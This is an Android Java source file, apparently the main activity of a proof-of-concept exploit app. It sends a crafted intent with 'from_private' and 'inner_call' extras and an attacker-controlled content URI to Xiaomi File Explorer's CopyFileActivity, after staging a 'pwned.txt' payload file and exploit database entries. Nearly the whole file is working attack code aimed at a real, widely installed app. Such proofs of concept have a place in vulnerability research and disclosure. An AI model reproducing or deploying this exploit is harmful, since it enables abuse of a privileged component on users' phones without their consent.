package com.fileexplorer.exploit;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

import android.util.Log;
import android.widget.Button;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button button = findViewById(R.id.exploit);
        button.setOnClickListener(view -> setupDatabaseAndIntent());
    }



    private void setupDatabaseAndIntent() {
        copyFileToInternalStorage();

        DatabaseHelper dbHelper = new DatabaseHelper(this);
        dbHelper.insertExploitData();

        Uri uri = Uri.parse("content://com.fileexplorer.exploit/pwned.txt");
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.mi.android.globalFileexplorer", "com.android.fileexplorer.activity.CopyFileActivity"));
        intent.putExtra("from_private", true);
        intent.putExtra("inner_call", true);
        intent.putExtra("explorer_path", "content://com.fileexplorer.exploit/pwned.txt");
        intent.setData(uri);
        intent.setAction(Intent.ACTION_SEND);
        startActivity(intent);
    }

    private void copyFileToInternalStorage() {
        try {
//            InputStream inputStream = getResources().openRawResource(R.raw.pwned); //get from res directory
            InputStream inputStream = getAssets().open("pwned.txt"); //get from assets directory
            File outFile = new File(getFilesDir(), "pwned.txt");
            FileOutputStream outputStream = new FileOutputStream(outFile);

            byte[] buffer = new byte[1024];
            int length;
            while ((length = inputStream.read(buffer)) > 0) {
                outputStream.write(buffer, 0, length);
            }

            outputStream.close();
            inputStream.close();
        } catch (IOException e) {
            Log.e("MainActivity", "Error copying file to internal storage", e);
        }
    }
}
